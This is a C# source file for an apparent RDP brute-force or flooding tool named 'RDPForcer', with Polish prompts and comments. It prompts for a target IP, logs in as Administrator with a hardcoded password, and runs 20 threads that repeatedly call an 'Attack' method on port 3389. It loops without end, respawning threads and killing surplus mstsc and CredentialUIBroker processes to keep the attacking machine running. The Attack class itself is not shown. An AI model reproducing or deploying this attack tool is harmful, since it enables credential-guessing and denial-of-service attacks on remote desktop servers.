using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RDPForcer
{
    class Program
    {
        static  int thredsnum = 20;
        static public List<Thread> threadList = new List<Thread>();
        static void Main(string[] args)
        {
            Assembly assem = Assembly.GetExecutingAssembly();
            AssemblyName assemName = assem.GetName();
            Version ver = assemName.Version;
            Console.WriteLine("{0}, Version {1}", assemName.Name, ver.ToString());
            Console.WriteLine("Podaj adres IP, na który przepuszczamy atak:");
            var ip = Console.ReadLine();
            RDPClient client = new RDPClient();
            client.ConnectToRemoteDesktop(("Administrator", ".", "dupadupa", ip));
            Thread.Sleep(10000);
            for (int i=0;i< thredsnum;i++)
            {
                RDPConnector connector = new RDPConnector(3389, ip,"Administrator");
                Thread t = new Thread(new ThreadStart(connector.Attack));
                t.Start();
                threadList.Add(t);
            }
            var counter = 0;
            while (true)
            {
                for(int i=0;i<thredsnum;i++)
                {
                    //czyszczenie by nie zabić hosta
                    String[] pNames = { "mstsc", "CredentialUIBroker" };
                    foreach(string name in pNames)
                    {
                        Process[] p = Process.GetProcessesByName(name);
                        if (p.Length > thredsnum)
                        {
                            Thread.Sleep(5000);
                            for (int j = 0; j < thredsnum; j++)
                            {
                                try
                                {
                                    p[j].Kill();
                                }
                                catch
                                {
                                    Console.WriteLine("Proces został już zakończony");
                                }
                            }
                        }
                    
                    }
                    {
                        threadList = new List<Thread>();
                        RDPConnector connector = new RDPConnector(3389, ip, "Administrator");
                        Thread t = new Thread(new ThreadStart(connector.Attack));
                        t.Start();
                        threadList.Add(t);
                    }
                }
                Thread.Sleep(1000);
            }
        }


    }
}
